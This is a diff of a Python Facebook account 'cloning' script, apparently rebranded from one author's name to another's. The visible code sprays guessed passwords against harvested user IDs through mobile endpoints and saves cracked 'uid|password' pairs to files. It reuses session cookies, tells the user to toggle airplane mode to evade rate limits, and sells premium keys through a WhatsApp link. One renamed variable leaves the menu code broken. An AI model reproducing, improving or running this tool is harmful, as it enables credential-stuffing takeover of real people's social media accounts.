@@ -28,7 +28,7 @@ import subprocess
 from concurrent.futures import ThreadPoolExecutor
 import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
 try:
-	import rich#00E4FF
+	import rich
 except ImportError:
 	os.system('pip install rich')
 	time.sleep(1)
@@ -278,9 +278,8 @@ def name2():
 	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
-	                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-	        	
-                        frs = nmf.split(' ')[0]
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
 			pwv = ['445566']
 			if len(nmf)<6:
 				if len(frs)<3:
@@ -389,7 +388,7 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""\033[1;32m
-
+       
 ⢠⣶⣾⣷⣦⡀⠀⣤⣤⣤⣤⣄⠀⣤⣤⣤⣤⣤⣤⣤
 ⣾⣿⠁⢸⣿⣧⠀⣿⣿⠉⠹⣿⣆⠉⠉⠉⠉⣿⣿⠟
 ⣿⣿⠀⠘⠛⠛⠀⣿⣿⠀⠀⣿⣿⠀⠀⠀⣼⣿⡟
@@ -439,7 +438,7 @@ class Main:
 		print(" [4] 2009-10 Cloning")
 		print(" [5] 2011-14 Cloning")
 		print(" [E] Exit Programming\n")
-		BASSEY =input(" Choose : ")
+		UZAIR =input(" Choose : ")
 		if BASSEY in ["1", "01"]:
 			File()
 		if BASSEY in ["2", "02"]:
@@ -470,10 +469,10 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] USE (ultimate123) FOR IDZ\033[1;37m ")
+				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 11 CHARACTERS"%(B))
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
@@ -851,7 +850,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ UZAIR ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ BASSEY ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -876,7 +875,7 @@ class Main:
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ UZAIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-UZAIR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-BASSEY-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1278,7 +1277,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [UZAIR ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [BASSEY ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1298,12 +1297,12 @@ class Main:
 				print("\r \033[0;92m[ UZAIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-UZAIR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-BASSEY-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ UZAIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ BASSEY-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-UZAIR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-BASSEY-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1342,6 +1341,6 @@ def Subscraption():
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
-		os.system('am start https://wa.me/+923407275127?text=' + tks)
+		os.system('am start https://wa.me/+2347052802953?text=' + tks)
 		Subscraption()        
 Main()
